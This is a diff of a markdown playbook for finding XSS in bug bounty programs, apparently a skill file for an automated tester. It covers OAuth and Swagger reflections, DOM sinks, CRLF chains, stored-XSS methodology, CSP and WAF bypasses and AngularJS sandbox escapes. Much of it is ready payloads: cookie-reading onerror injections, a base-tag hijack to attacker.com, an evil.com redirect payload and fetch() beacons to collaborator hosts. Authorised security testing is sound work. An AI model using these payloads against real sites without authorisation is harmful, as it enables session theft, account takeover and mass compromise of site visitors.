+| Framework | Safe Pattern | DANGEROUS Pattern |
+|---|---|---|
+| Django Jinja2 | `{{ q }}` (auto-escaped) | `{{ q|safe }}` or `{% autoescape off %}` |
+| Flask + Jinja2 | `{{ q }}` (auto-escaped) | `{{ q|safe }}` or `Markup(q)` |
+| Node.js + EJS | `<%= q %>` (HTML-escaped) | `<%- q %>` (RAW) |
+| PHP + Laravel/Blade | `{{ $q }}` (htmlspecialchars) | `{!! $q !!}` (RAW) |
+| Ruby on Rails + ERB | `<%= q %>` (HTML-escaped) | `raw(q)` or `q.html_safe` |
+| Java + Spring/Thymeleaf | `th:text="${q}"` | `th:utext="${q}"` (RAW) |
+| Go html/template | `{{.Q}}` (context-aware) | `template.HTML(q)` (declared safe) |
+
+---
+
+## OAuth / OIDC Error Parameter Vectors
+
+OAuth flows create multiple reflected XSS surfaces, especially in error display pages.
+
+### Vulnerable Parameters
+
+```
+redirect_uri, redirect_url, return_url, returnTo, next, continue, callback,
+redirect, destination, target, error, error_description, state, login_hint
+```
+
+### Testing Patterns
+
+```
+GET /oauth/authorize?response_type=code&client_id=app&redirect_uri="><script>alert(1)</script>&state=test
+
+GET /auth/callback?error=access_denied&error_description=<script>alert(1)</script>
+
+GET /login?next=javascript:alert(1)
+
+GET /sso/callback?redirect_uri=javascript:alert(1)
+
+GET /oauth/authorize?client_id=app&state="><img src=x onerror=alert(1)>
+```
+
+### Real HackerOne Findings
+
+| Program | Vulnerable Parameter | Bounty |
+|---|---|---|
+| LINE Corporation | OAuth redirect parameter | $1,989 |
+| Shopify | OAuth redirect parameter | $1,750 |
+| Reddit | Redirect parameter | $5,000 |
+| TikTok | OAuth/redirect parameter | $5,000 |
+| Twitter | CRLF -> reflected XSS | $1,680 |
+
+### Recent CVEs
+
+| CVE | Product | Mechanism |
+|---|---|---|
+| CVE-2025-62800 | FastMCP | OAuth callback page did not sanitize reflected parameters |
+| CVE-2026-77272 | MCP Atlassian | OAuth setup callback handler reflected parameters unsanitized |
+| CVE-2026-40302 | OpenZiti zrok | GitHub OAuth callback unsanitized `refreshInterval` error rendering |
+
+---
+
+## Swagger UI / API Documentation XSS
+
+### Swagger UI DOM XSS (GHSA-qrmm-w75w-3wpx)
+
+**Affected:** Swagger UI < 4.1.3
+
+**Attack:** The `url` and `configUrl` query parameters specify which OpenAPI spec to load. An attacker-controlled spec URL causes Swagger UI to fetch and render attacker-controlled content via `innerHTML`.
+
+```
+/swagger-ui/index.html?url=https://attacker.com/evil-spec.json
+/api-docs?url=data:application/json,{"swagger":"2.0","info":{"title":"<img src=x onerror=alert(1)>","version":"1"}}
+```
+
+**Predictable paths to check:**
+```
+/swagger-ui/        /swagger-ui.html    /api-docs
+/swagger            /swagger.json       /swagger.yaml
+/redoc              /graphql            /graphiql
+/graphql/playground /docs               /api/docs
+/v1/docs            /v2/docs
+```
+
+**HackerOne targets:** Adobe, IBM, U.S. Department of Defense have all received Swagger UI XSS reports.
+
+### Other API Documentation Renderers
+
+| Renderer | XSS Surface |
+|---|---|
+| ReDoc | Config injection via query parameters |
+| GraphQL Playground | Query reflection in UI |
+| GraphiQL | Same as GraphQL Playground |
+| Postman Published Docs | User-generated content in renderer |
+
+---
+
+## DOM-Based Reflected XSS Source-Sink Pairs
+
+Hybrid patterns where the server reflects the value into the page and client-side JS then processes it into a dangerous sink.
+
+**Pattern 1: URL parameter -> innerHTML**
+```javascript
+const q = document.getElementById('search-data').dataset.query;
+document.getElementById('results-title').innerHTML = 'Results for: ' + q;  // SINK
+```
+
+**Pattern 2: Reflected JSON -> innerHTML via client parsing**
+```javascript
+// Server: <script>var config = {query: "VALUE"};</script>
+document.getElementById('title').innerHTML = config.query;  // SINK
+```
+
+**Pattern 3: location.search -> innerHTML**
+```javascript
+const params = new URLSearchParams(location.search);
+document.getElementById('msg').innerHTML = 'You searched for: ' + params.get('q');  // SINK
+```
+
+**Pattern 4: textContent reversal**
+```javascript
+element.textContent = serverRenderedValue;  // safe
+anotherElement.innerHTML = element.textContent;  // SINK: encoding reversed
+```
+
+**Key DOM sinks:**
+```javascript
+element.innerHTML = value;
+element.outerHTML = value;
+document.write(value);
+document.writeln(value);
+element.insertAdjacentHTML('beforeend', value);
+eval(value);
+setTimeout(value, 0);        // string form
+setInterval(value, 0);       // string form
+new Function(value)();
+$.html(value);               // jQuery
+$(value);                    // jQuery selector with HTML
+element.attr('href', value); // jQuery with javascript:
+```
+
+---
+
+## CRLF Injection to Reflected XSS Chain
+
+CRLF injection (`%0D%0A`) in parameters reflected into HTTP response headers allows full response body control.
+
+**Payload:**
+```
+/redirect?url=https://example.com%0D%0AContent-Type:%20text/html%0D%0A%0D%0A<script>alert(1)</script>
+```
+
+**Resulting response:**
+```
+HTTP/1.1 302 Found
+Location: https://example.com
+Content-Type: text/html
+
+<script>alert(1)</script>
+```
+
+**Modern mitigations:** Node.js v14+ throws on CRLF in `setHeader()`. Apache and Nginx reject CRLF in header values. Framework-generated headers are generally safe; custom header construction is not.
 
 ---
 
 ## Stored XSS Playbook — store once, enumerate every render surface
 
-Stored XSS is not "I posted a payload and it came back". It is a data-flow bug:
-one **write sink** → one or more **read sinks** → one or more **viewers**.
-Every step must be proven separately, because applications routinely encode the
-value on the page where you submitted it and render it raw on another page,
-in a different context, for a different audience.
+Stored XSS is a data-flow bug: one **write sink** -> one or more **read sinks** -> one or more **viewers**. Every step must be proven separately.
 
-Ground truth from disclosed reports: Acronis #1084183 ($50, Medium) was a
-*profile signature* rendered on a public profile; Shopify #1147433 ($5,300,
-Medium 5.4) was a *rich-text HTML editor* on `/admin/product` and
-`/admin/collections`; MoPub #485748 ($700, High) was a *report name* shown to
-anyone opening the report; GitLab #1481207 (High 8.7) was *Markdown HTML
-injection* chained to a `<base>` CSP bypass. Same primitive, wildly different
-payouts — the difference is always render surface, viewer privilege, and proof.
+Ground truth from disclosed reports: Acronis #1084183 ($50, Medium) was a *profile signature*; Shopify #1147433 ($5,300, Medium 5.4) was a *rich-text HTML editor*; MoPub #485748 ($700, High) was a *report name*; GitLab #1481207 (High 8.7) was *Markdown HTML injection + `<base>` CSP bypass*.
 
-### 1. Build the field → render-surface map before payloading
-
-List every writable field, then for each one find **all** read sinks. Do not stop
-at the response to your own POST.
+### 1. Build the field -> render-surface map before payloading
 
 | Write field | Surfaces to check after storing |
 |---|---|
@@ -530,211 +1127,88 @@ at the response to your own POST.
 | Rich-text / HTML editor / Markdown source | detail page, rendered preview, revision history, wiki/README, sitemap |
 
 Rules:
-
-- **The same string can be safe in one sink and live in another.** Test the
-  text sink *and* the attribute sink (`title="…"`, `alt="…"`, `href="…"`) *and*
-  the JS sink (`var x = "…"`, JSON echoed into a script block). Each needs its
-  own context probe (`aaa"bbb'ccc<ddd>eee&fff`).
-- **A username/bio is a worm vector**, not a self-XSS: it is rendered next to
-  every comment/post the account makes. One account with a malicious username
-  infects every page it touches (#1084183 pattern).
-- **Private surfaces still count** — admin ticket views, moderation queues and
-  notification emails are the high-value readers. Plant early, check later
-  (see **OOB-Or-It-Didn't-Happen Gate**).
-- **Edit and delete flows re-render too**: update the stored value, then check
-  the page, the revision history, and the "deleted" tombstone.
+- **A username/bio is a worm vector** — rendered next to every comment/post the account makes.
+- **Private surfaces still count** — admin ticket views, moderation queues and notification emails are the high-value readers.
+- **Edit and delete flows re-render too**: update the stored value, then check the page, revision history, and the "deleted" tombstone.
 
 ### 2. Store with a unique canary and prove authorship
 
-Other testers' payloads are already on shared targets (our lab page carried
-`confirm(778832)` and `confirm(100)` before we arrived). Never reuse a canary
-you did not create, and never claim a dialog you cannot attribute.
-
-1. Capture the **baseline page before writing** and `grep` for your canary —
-   it must be absent (count 0). Keep that file as evidence.
-2. Use a unique number per sink: `qa-735194`, `confirm(735194)`,
-   `document.title='XSS_735195'`. Record the exact timestamp/author row the app
-   renders next to it.
-3. After writing, fetch the render page as a **different identity** (logged-out
-   or second account) and confirm the payload is in the response *for that
-   viewer*. This is the stored-XSS equivalent of a reflection check.
-4. Keep a small ledger: `canary → field → render URL → viewer context → status`.
-   If a payload mysteriously disappears, the ledger tells you whether it was
-   overwritten, moderated, or never stored.
+1. Capture the **baseline page before writing** and grep for your canary — it must be absent (count 0). Keep that file as evidence.
+2. Use a unique number per sink: `qa-735194`, `confirm(735194)`, `document.title='XSS_735195'`.
+3. After writing, fetch the render page as a **different identity** (logged-out or second account) and confirm the payload is in the response *for that viewer*.
+4. Keep a small ledger: `canary -> field -> render URL -> viewer context -> status`.
 
 ### 3. Hidden, constrained and identity fields
 
-The UI is not the API. Every field the browser sends is attacker-controlled.
-
-- **Hidden inputs and `action` selectors** (`movie_id`, `action=add_comment`,
-  `movie_title`, `auth_type=register`) — replay the request with your own values
-  and extra fields. A hidden `movie_title` is often ignored at render time, but
-  the same hidden pattern feeds audit logs, emails and admin lists.
-- **Selects / radio / badge pickers** (`rating`, `feeling`, `priority`,
-  `category`) — the fixed option list is client-side; POST an arbitrary string.
-  In our lab the "feeling" badge stored and rendered raw despite a closed
-  dropdown.
-- **Registration fields** — username, full name, company, job title. Register a
-  throwaway account with the payload in each field, then browse as a guest.
-  Email verification is frequently absent; do not assume it blocks storage.
-- **Avatar/cover URLs, website/social links** — `javascript:` in `href`, or a
-  `data:` URI in `src`, with no tag needed at all.
+- **Hidden inputs and `action` selectors** — replay the request with your own values and extra fields.
+- **Selects / radio / badge pickers** — POST an arbitrary string; the fixed option list is client-side only.
+- **Registration fields** — username, full name, company, job title. Register with the payload in each field, then browse as a guest.
+- **Avatar/cover URLs, website/social links** — `javascript:` in `href`, or a `data:` URI in `src`.
 
 ### 4. Rich-text / HTML editors (#1147433 pattern)
-
-When a product has a "Show HTML" / source / Markdown mode, the sanitizer is
-usually the only defense:
 
 ```html
 ">]<img src=x onerror=alert(document.domain)>
 "><img src=x onerror=alert(document.cookie)>
 ```
 
-- Submit through the **editor's source mode**, save, then open the *public*
-  entity page (not the editor) and check the unencoded tag.
-- Test every sibling editor: product, collection, gift card, page, blog post,
-  email template. A fix applied to one controller often misses the others; the
-  Shopify report was extended to `/admin/gift_cards/products` after triage.
-- After the vendor ships a fix, **retest the exact field** — Shopify reverted
-  their first patch, and MoPub's first fix left account-settings and report-tab
-  endpoints vulnerable (#485748 follow-up #503298).
+- Submit through the **editor's source mode**, save, then open the *public* entity page (not the editor).
+- Test every sibling editor: product, collection, gift card, page, blog post, email template. A fix applied to one controller often misses the others.
 
 ### 5. Markdown, sanitizer timing and CSP (#1481207 pattern)
 
-Markdown/wiki/README renderers add three distinct injection stages. They behave
-differently and need different payloads:
+Markdown/wiki/README renderers add three distinct injection stages:
 
-1. **Stage 1 — server-rendered initial HTML**: the payload is in the first
-   response (issue description, wiki page, README on a user profile, project
-   description). Full markup is live before any client-side sanitizer runs.
-2. **Stage 2 — post-load DOM**: comments/notes fetched by JS and inserted into
-   the DOM. Sanitizers such as DOMPurify may run *after* insertion, so tags and
-   event handlers execute for a split second; CSP is then the only thing left.
-3. **Stage 3 — client-side preview / error rendering**: the value is composed
-   by JS from input; look for `innerHTML` sinks and MutationObserver-driven
-   re-renders.
+1. **Stage 1 — server-rendered initial HTML**: payload is in the first response.
+2. **Stage 2 — post-load DOM**: comments/notes fetched by JS and inserted into the DOM. Sanitizers may run *after* insertion, so tags and event handlers execute for a split second.
+3. **Stage 3 — client-side preview / error rendering**: the value is composed by JS from input.
 
-Practical checks:
-
-- Does the page allow `<base href=https://attacker.tld>`? If yes, **every
-  relative script URL on the page resolves to your host**. If those `<script>`
-  tags carry the CSP nonce, the browser will happily load and execute your
-  file — a full CSP bypass with no inline script at all:
-  ```html
-  <base href=https://attacker.tld>
-  ```
-  Serve the exact relative paths the page requests (`/assets/webpack/*.js`) and
-  a redirect-all `.htaccess` while testing; this survives asset-hash changes.
-- Transient execution before sanitization: if CSP blocks inline but not
-  same-origin script loads, combine a stage-1 injection with an
-  `<iframe srcdoc>`, `<meta http-equiv=refresh>`, or a same-origin script
-  gadget. On self-hosted/low-CSP instances the same payload gives full XSS.
-- Script gadgets: allowlisted `data-*` attributes plus framework code that
-  interpolates them into HTML (e.g. jQuery `.attr('title')` → `$('<p>…')`).
-  Look for `data-remote`, `data-method`, `data-url`, `data-confirm` handlers.
-- If CSP has no `unsafe-inline`, do not declare "not vulnerable" — pivot to a
-  `<base>` hijack, an SVG/HTML upload on the same origin, or a JSONP endpoint on
-  an allowlisted host (see **Chain 4**).
+Does the page allow `<base href=https://attacker.tld>`? If yes, **every relative script URL on the page resolves to your host**. If those `<script>` tags carry the CSP nonce, the browser will happily load and execute your file — a full CSP bypass with no inline script at all.
 
 ### 6. Sibling endpoints, partial fixes and duplicates
 
-One root cause is rarely one endpoint. When you confirm a stored sink, sweep:
+When you confirm a stored sink, sweep: the same field on other object types, the same controller under other routes (`/admin/...`, `/api/...`, mobile API), other tenants/stores in the same SaaS, the public vs admin render of the same row.
 
-- the same field on other object types (product / collection / gift card /
-  page / blog / email template),
-- the same controller under other routes (`/admin/...`, `/api/...`, mobile API),
-- other tenants/stores in the same SaaS,
-- the public vs admin render of the same row.
-
-Report the shared root cause once, list every endpoint and every payload that
-still fires, and keep the list for retest. If a follow-up shows a remaining
-endpoint after the "fix", reopen or file a bypass report with the new endpoint
-and the retest evidence — it is a new finding, not a duplicate.
-
-### 7. Severity ladder for stored XSS (do not inflate)
+### 7. Severity ladder for stored XSS
 
 | Situation | Typical severity |
 |---|---|
 | Payload renders only on a page the author themselves views (self-XSS), no CSRF trigger | Low / N/A |
-| Public page, any visitor executes | Medium–High |
+| Public page, any visitor executes | Medium-High |
 | Viewer is admin/moderator/support agent (privilege escalation) | High |
-| Session cookie JS-readable (no `HttpOnly`) or token exfil → account takeover | High |
-| Username/bio rendered on every page → worm/mass compromise | High–Critical |
+| Session cookie JS-readable (no `HttpOnly`) or token exfil -> account takeover | High |
+| Username/bio rendered on every page -> worm/mass compromise | High-Critical |
 | CSP bypass + token creation (GitLab-class) | High |
-
-An `alert()` alone proves execution, not impact. State what the JS can reach:
-`document.cookie` (is `HttpOnly` set?), same-origin APIs, CSRF tokens, admin
-endpoints. If the only victim is the author, do not file it as stored XSS
-unless you can chain a CSRF/state-change trigger (**Chain 2**).
 
 ### 8. Stored-XSS evidence checklist
 
-1. Baseline file with the canary absent (`grep -c` = 0) and its timestamp.
-2. The write request (or a redacted equivalent) and the stored row's author +
-   timestamp as rendered by the app.
-3. Render URL opened in a **fresh, cookie-less browser context** with a dialog
-   observed (`Page.javascriptDialogOpening` via CDP, or ego `acceptDialog()`);
-   save the event JSON and a screenshot scrolled to the payload.
-4. A second render surface checked (list/profile/nav) — proves scope, not just
-   one page.
-5. Response headers for the render page: `Content-Security-Policy`,
-   `Content-Type`, `Cache-Control`, `Set-Cookie` (`HttpOnly`/`Secure`/`SameSite`).
-6. For private/admin surfaces where you cannot log in as the viewer, use an OOB
-   beacon (`fetch('//bxss-<tag>.<collab>/x')`) and wait.
-7. Note whether the payload persists after edit/delete, and clean up test
-   content on production programs when the policy requires it.
+1. Baseline file with the canary absent and its timestamp.
+2. The write request and the stored row's author + timestamp as rendered by the app.
+3. Render URL opened in a **fresh, cookie-less browser context** with a dialog observed.
+4. A second render surface checked (list/profile/nav) — proves scope.
+5. Response headers for the render page: `Content-Security-Policy`, `Content-Type`, `Cache-Control`, `Set-Cookie` (`HttpOnly`/`Secure`/`SameSite`).
+6. For private/admin surfaces where you cannot log in as the viewer, use an OOB beacon (`fetch('//bxss-<tag>.<collab>/x')`) and wait.
 
 ### 9. Disclosed-report calibration
 
-| Report | Program / severity | Sink and payload core | Why it paid | Takeaway |
-|---|---|---|---|---|
-| #1084183 | Acronis, Medium, $50 | Profile **signature**: `<xss onmouseover="alert(1)">test</xss>` | Public profile page executes for any visitor; bounty low because impact is one profile at a time | Custom/unknown tags with event handlers still parse; profile/bio fields are a real sink, not just comments |
-| #1147433 | Shopify, Medium 5.4, $5,300 | **Rich-text HTML editor** (product / collection description): `">]<img src=x onerror=alert(document.domain)>` | Admin context, source-mode bypass, sibling endpoint `/admin/gift_cards/products` also vulnerable | Always test "Show HTML" mode and every sibling editor; a per-controller fix leaves copies live |
-| #485748 | MoPub/Twitter, High, $700 | **Report name**: `"><img src=x onerror=alert(document.domain)>` | Name rendered in every view of the saved report; same root cause across many endpoints (#492913, #492444, #487370, #485736) | "Name/title" fields are stored sinks; a broad fix may still miss fields — retest each and file the remainder (#503298) |
-| #1481207 | GitLab, High 8.7 | **Markdown HTML injection + `<base href=https://attacker>`** | Base tag re-points CSP-nonced relative script URLs to attacker host → full CSP bypass | When CSP blocks inline, look for base-tag/JSONP/upload bypasses; client-side DOMPurify after insertion gives transient execution; distinguish stage-1 vs stage-2 sinks |
-
-Common thread: none of these were found by re-reading the submit response. Each
-required opening a *different* page as a *different* viewer after the value was
-stored — and three of the four needed a second endpoint or a second pass after
-a partial fix.
-
-### 10. Worked example — three sinks, one page
-
-A PHP movie app exposed three stored sinks on the same detail page; all were
-confirmed in a cookie-less browser, not just by curl:
-
-1. **Comment body** — `POST /<id>` with `action=add_comment&comment=…` stored
-   `qa-735194 '"<><img src=x onerror=confirm(735194)>` raw in a `<div>`. The
-   first POST silently no-op'd because the hidden `action=add_comment` field was
-   missing; always copy the *complete* form payload, hidden fields included.
-2. **Username** — registration accepted
-   `qa7361x"><img src=x onerror=confirm(736101)>`; the app rendered it raw in the
-   nav **and** in every comment card's `@username`. A throwaway account posting
-   one normal comment turned it into a public payload on `/102`.
-3. **Feeling badge** — a closed dropdown, but the POST value was stored verbatim;
-   `"><img src=x onerror=confirm(736103)>` executed from
-   `<span class="comment-feeling-tag">`.
-
-What made the proof hold up: baseline captured before posting (canary absent),
-author+timestamp row from the app distinguishing our comments from earlier
-testers' `confirm(778832)`/`confirm(100)`, dialogs observed in a fresh guest
-Chrome, and `Set-Cookie: PHPSESSID=…; path=/` with no `HttpOnly` — so the same
-script could read the session cookie and take over the account. The hidden
-`movie_title` field, by contrast, was stored but never rendered → `no-reflection`,
-and was dropped rather than padded into a false finding.
+| Report | Program / severity | Sink and payload core | Takeaway |
+|---|---|---|---|
+| #1084183 | Acronis, Medium, $50 | Profile **signature**: `<xss onmouseover="alert(1)">test</xss>` | Custom/unknown tags with event handlers still parse; profile/bio fields are a real sink |
+| #1147433 | Shopify, Medium 5.4, $5,300 | **Rich-text HTML editor**: `">]<img src=x onerror=alert(document.domain)>` | Always test "Show HTML" mode and every sibling editor; a per-controller fix leaves copies live |
+| #485748 | MoPub/Twitter, High, $700 | **Report name**: `"><img src=x onerror=alert(document.domain)>` | "Name/title" fields are stored sinks; broad fix may still miss fields — retest each |
+| #1481207 | GitLab, High 8.7 | **Markdown HTML injection + `<base href=https://attacker>`** | When CSP blocks inline, look for base-tag/JSONP/upload bypasses |
 
 ---
 
 ## Crown Jewel Targets
 
-XSS is high-value when it combines **privileged context + persistent delivery + scope escalation**. The highest payouts come from:
+XSS is high-value when it combines **privileged context + persistent delivery + scope escalation**:
 
-- **Admin panels and authenticated dashboards** (e.g., `*/admin`, `*/settings`) — attacker can hijack sessions with elevated privileges, exfiltrate tokens, or pivot to account takeover
-- **Payment/financial flows** (`paypal.com`, checkout pages, currency converters) — XSS here enables credential harvesting and financial fraud at scale
-- **Stored XSS in collaborative features** (wikis, markdown renderers, issue trackers, RDoc, labels, tags) — one payload infects every viewer, multiplying impact
-- **SSO/signin pages** (e.g., `paypal.com/signin`) — XSS here is critical because it can steal auth tokens across the entire platform
+- **Admin panels and authenticated dashboards** — attacker can hijack sessions with elevated privileges, exfiltrate tokens, or pivot to account takeover
+- **Payment/financial flows** (`paypal.com`, checkout pages) — XSS here enables credential harvesting and financial fraud at scale
+- **Stored XSS in collaborative features** (wikis, markdown renderers, issue trackers, RDoc, labels, tags) — one payload infects every viewer
+- **SSO/signin pages** — XSS here is critical because it can steal auth tokens across the entire platform
 - **Shared SaaS tenant surfaces** (`*.myshopify.com`, `api.collabs.*`) — XSS in one tenant's context can bleed across tenant boundaries
-- **Help/documentation sites** (`help.shopify.com`) — lower severity individually, but often have looser sanitization and trusted user perception
 - **SVG/file upload endpoints** — frequently bypasses CSP and sanitization simultaneously
 
 **Asset types that pay most:** Main product domains > Admin subdomains > API endpoints > Marketing/help sites
@@ -743,36 +1217,34 @@ XSS is high-value when it combines **privileged context + persistent delivery + 
 
 ## OOB-Or-It-Didn't-Happen Gate (Blind / Stored XSS)
 
-For blind and stored XSS — claims require an out-of-band confirmation, the same as blind SSRF. The OOB receiver fires when the payload actually executes in a browser somewhere (an admin reviewing logs, a SOC analyst opening a ticket, an email rendering a stored payload).
+For blind and stored XSS — claims require an out-of-band confirmation.
 
 ### What is NOT confirmation
 
-- ASP.NET request validator rejected your `<` and returned a different status code → not XSS, that's WAF noise.
-- Your payload appears in the response body URL-encoded or HTML-encoded → not XSS, that's correct output encoding.
-- The form action attribute contains your payload string as `%22onclick%3D…` → not XSS, the browser does NOT decode URL encoding inside HTML attribute values; the `%22` stays as literal `%22` in the DOM.
-- Your `<script>` tag appears in the response as `&lt;script&gt;` → not XSS, that's escaping.
+- ASP.NET request validator rejected your `<` and returned a different status code -> not XSS, that's WAF noise.
+- Your payload appears in the response body URL-encoded or HTML-encoded -> not XSS, that's correct output encoding.
+- The form action attribute contains your payload string as `%22onclick%3D...` -> not XSS, the browser does NOT decode URL encoding inside HTML attribute values.
+- Your `<script>` tag appears in the response as `&lt;script&gt;` -> not XSS, that's escaping.
 
 ### What IS confirmation
 
-- A request to your unique Collaborator subdomain (e.g., `bxss-err-<random>.<collab>.oastify.com`) arrives in the OOB listener after your payload was stored / reflected / queued.
-- For stored XSS: the request arrives **hours or days later** when an admin views the affected resource. Plant payloads early in the engagement and keep the listener open.
-- **Public stored XSS has a second, equally valid proof**: fetch the render page in a fresh browser profile that has never authenticated and observe the dialog (`Page.javascriptDialogOpening`) or a deterministic DOM change. The value was stored server-side and executed for a viewer the author is not — no OOB needed. Use the OOB beacon only for private/admin-only surfaces you cannot open yourself.
-- The User-Agent of the firing request is a browser (Mozilla/Chrome), not the server's own backend HTTP client.
+- A request to your unique Collaborator subdomain arrives in the OOB listener after your payload was stored / reflected / queued.
+- For stored XSS: the request arrives **hours or days later** when an admin views the affected resource.
+- **Public stored XSS has a second proof**: fetch the render page in a fresh browser profile that has never authenticated and observe the dialog.
 
 ### Where to plant blind-XSS beacons
 
-Any field whose value might be viewed in an admin UI / log viewer / email / report later:
-- Error messages (`?ErrorMessage=<svg onload=fetch('//bxss-<tag>.<collab>/x')>`)
-- Auth-flow source params (`?Source=`, `?ReturnUrl=`)
-- Login form username field (admin may view audit logs of failed logins)
-- User-Agent header (some SOC consoles render UA as HTML)
-- Referer header (some analytics dashboards render Referer as HTML)
-- Email addresses on registration / contact forms
-- File-upload filenames
+```
+?ErrorMessage=<svg onload=fetch('//bxss-<tag>.<collab>/x')>
+?Source=<svg onload=fetch('//bxss-<tag>.<collab>/x')>
+Login form username field (admin may view audit logs of failed logins)
+User-Agent header (some SOC consoles render UA as HTML)
+Referer header (some analytics dashboards render Referer as HTML)
+Email addresses on registration / contact forms
+File-upload filenames
+```
 
 **Always sub-tag the Collaborator subdomain by sink** so callbacks identify which field fired.
-
-**Lesson from a authorized engagement:** 10 blind-XSS Collaborator beacons planted across `ErrorMessage`, `Source`, the Authentication.asmx username field, User-Agent header, Referer header, and request paths. Zero callbacks over a 10-minute polling window. Conclusion: the SharePoint SOC views logs / errors in tooling that does not render HTML, AND the ASP.NET request validator blocks `<` in query strings before the payload reaches storage. Stored-XSS claim correctly retracted.
 
 ---
 
@@ -780,18 +1252,9 @@ Any field whose value might be viewed in an admin UI / log viewer / email / repo
 
 **URL Patterns:**
 ```
-/admin*
-/settings*
-/wiki*
-/reports*
-?utm_source=
-?redirect=
-?q=
-?search=
-?callback=
-?return_url=
-/render*
-/preview*
+/admin*     /settings*    /wiki*      /reports*
+?utm_source=  ?redirect=  ?q=         ?search=
+?callback=    ?return_url= /render*   /preview*
 /documentation*
 ```
 
@@ -820,7 +1283,7 @@ $(location
 
 **Tech Stack Signals:**
 - Rails applications using `html_safe`, `raw`, `translate`, Action Text, or ActionView sanitize helpers
-- GitLab/GitHub markdown pipelines (Banzai, Kramdown, RDoc, Kroki)
+- GitLab/GitHub markdown pipelines (Banzai, Kramdown, Kroki)
 - Applications allowing SVG uploads or rendering
 - Sites using `style` tag in allowlists
 - Kroki/Mermaid/PlantUML diagram rendering endpoints
@@ -828,20 +1291,117 @@ $(location
 
 ---
 
+## CSP Bypass Techniques
+
+A CSP with `script-src` restrictions blocks inline script execution but does NOT fix the underlying injection flaw.
+
+### JSONP Endpoints on Same Origin
+
+If `script-src 'self'` and the same origin has a JSONP endpoint:
+```
+/api/data?callback=alert(1)
+/jsonp?cb=alert(document.cookie)
+```
+
+**Common JSONP paths:**
+```
+/api/jsonp?callback=
+/api/data.jsonp?callback=
+/services/json?callback=
+/api?format=jsonp&callback=
+/?format=json-p&jsoncallback=
+```
+
+### Angular CDN Bypass
+
+If CSP allows `ajax.googleapis.com`:
+```html
+<script src="//ajax.googleapis.com/ajax/libs/angularjs/1.0.1/angular.js"></script>
+<div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>
+```
+
+### strict-dynamic Bypass
+
+`'strict-dynamic'` trusts scripts loaded by already-trusted scripts. If a trusted script dynamically creates script elements from user input (DOM XSS sink), CSP is bypassed.
+
+### Missing base-uri
+
+Without `base-uri 'self'`, an injected `<base>` tag redirects all relative script loads:
+```html
+<base href="https://attacker.com/">
+```
+
+### SVG Upload Bypass
+
+CSP frequently applies to HTML responses but NOT to `image/svg+xml` responses. The SVG executes JS in the context of whichever origin serves it.
+
+### report-only = No Blocking
+
+`Content-Security-Policy-Report-Only:` does NOT block execution. Underlying injection is fully exploitable.
+
+---
+
+## Bypass Techniques
+
+**mXSS (Mutation XSS):**
+- `<math><style><img src=x onerror=...>` — tag combination creates parsing ambiguity
+- `<svg><style><img src=x onerror=...>` — same pattern
+
+**Filter Evasion:**
+```html
+<!-- Case variation — full rotation lists in "Tag-Name Case Variations" -->
+<ScRiPt>alert(1)</ScRiPt>
+<IMG SRC=x OnErRoR=alert(1)>
+<SvG/OnLoAd=alert(1)>
+<!-- Tag breaking -->
+<svg/onload=alert(1)>
+<!-- Event handler alternatives -->
+<body onpageshow=alert(1)>
+<input autofocus onfocus=alert(1)>
+<details open ontoggle=alert(1)>
+```
+
+**WAF Bypass:**
+```javascript
+<svg onload=eval(atob('YWxlcnQoMSk='))>
+<script>ale\u0072t(1)</script>
+<video src=x onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+```
+
+**Redirect-based XSS bypass:**
+```
+?next=javascript://%0aalert(1)
+?next=javascript&colon;alert(1)
+?redirect=//evil.com/%0d%0a%0d%0a<script>alert(1)</script>
+```
+
+**AngularJS client-side template injection (CSTI) & sandbox escapes:**
+- *Detect:* the page uses AngularJS (look for `ng-app`/`ng-controller` attributes). Probe a reflected param with `{{7*7}}` — if it renders `49`, the value is evaluated as an Angular expression.
+- *Execute JS by escaping the sandbox* (depends on AngularJS version):
+  - Common: `{{constructor.constructor('alert(1)')()}}` or `{{$eval.constructor('alert(1)')()}}`.
+  - **Hard variant — `$eval` unavailable AND string literals disallowed:** overwrite `String.prototype.charAt` (this disables the sandbox's per-character string checks), then use the `orderBy` filter with `String.fromCharCode` to build your JS with no quotes at all:
+    ```
+    ?PARAM=1&toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().constructor.fromCharCode(CODES)=1
+    ```
+- Applies to **legacy AngularJS (<1.6)** only.
+
+---
+
 ## Step-by-Step Hunting Methodology
 
 1. **Map all reflection points** — Spider the target and identify every place user input appears in HTML output. Prioritize: URL parameters, form fields, HTTP headers (User-Agent, Referer), file upload names/contents, and API response fields rendered in UI.
 
-2. **Classify by type** — Determine if each reflection is Reflected (URL param → response), Stored (database → later rendering), or DOM-based (JS reads URL/storage → DOM sink). Each requires different payload delivery.
+2. **Classify by type** — Determine if each reflection is Reflected (URL param -> response), Stored (database -> later rendering), or DOM-based (JS reads URL/storage -> DOM sink). Each requires different payload delivery.
 
 3. **Probe sanitizer behavior** — Send harmless canary strings first: `aaa"bbb'ccc<ddd>eee&fff` to determine which characters are escaped. Observe if output is in HTML context, attribute context, JS context, or URL context.
 
-   **Marker Discipline:** When choosing canary strings, they MUST be unique random alphanumeric strings (8+ chars, no English words, no protocol keywords). Bad markers: `test`, `marker`, `evil`, `attacker`, `payload`, `javascript`, `script`. Good markers: `cpmark987abc`, `x4hd2k9pq`, `__ZZ_MARKER_<random>_ZZ__`. Before claiming reflection, search the baseline (no-marker) response for the marker — if it appears naturally in the page (e.g., the word `javascript` is in every page's help-link hrefs), it's a false-positive trap and you need a different marker. This single check catches 80% of false-positive reflection reports.
+   **Marker Discipline:** Canary strings MUST be unique random alphanumeric strings (8+ chars, no English words, no protocol keywords). Bad markers: `test`, `marker`, `evil`, `javascript`, `script`. Good markers: `cpmark987abc`, `x4hd2k9pq`. Before claiming reflection, search the baseline (no-marker) response for the marker — if it appears naturally, it's a false-positive trap.
 
    **Then name the encoder from that canary and decide in one request:**
-   - **All of `& " ' < >` converted** → `htmlspecialchars()` / framework autoescape. **Skip this parameter, move to the next one** — see **HTML-Entity Encoding** for the three exceptions (`'` still raw under `ENT_COMPAT`, URL/unquoted attribute sinks, entity decoded later).
-   - **Only `<` `>` converted** (quotes raw) → attribute breakout is still live: `" onmouseover="alert(1)` / `' onmouseover='alert(1)`.
-   - **Nothing converted** → go straight to the dialog trio with the `'"<>` prefix.
+   - **All of `& " ' < >` converted** -> `htmlspecialchars()` / framework autoescape. Skip this parameter — see **HTML-Entity Encoding** for the three exceptions.
